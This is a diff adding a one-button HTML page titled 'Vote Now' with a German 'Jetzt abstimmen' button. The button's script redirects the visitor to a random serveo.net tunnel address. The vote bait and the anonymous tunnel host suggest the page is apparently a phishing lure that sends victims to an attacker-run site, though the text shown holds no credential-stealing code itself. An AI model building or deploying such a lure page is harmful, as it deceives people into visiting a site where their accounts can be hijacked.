@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vote Now</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-image: url('https://raw.githubusercontent.com/ShadowDY0/Voting-/main/IMG_4538.jpeg');
+            background-size: cover;
+            background-position: center;
+        }
+        .vote-button {
+            padding: 20px 40px;
+            font-size: 24px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .vote-button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <button class="vote-button" onclick="voteNow()">Jetzt abstimmen</button>
+    <script>
+        function voteNow() {
+            window.location.href = "https://86e2ad9e6fbe8c7eceb142231e494eb4.serveo.net";
+        }
+    </script>
+</body>
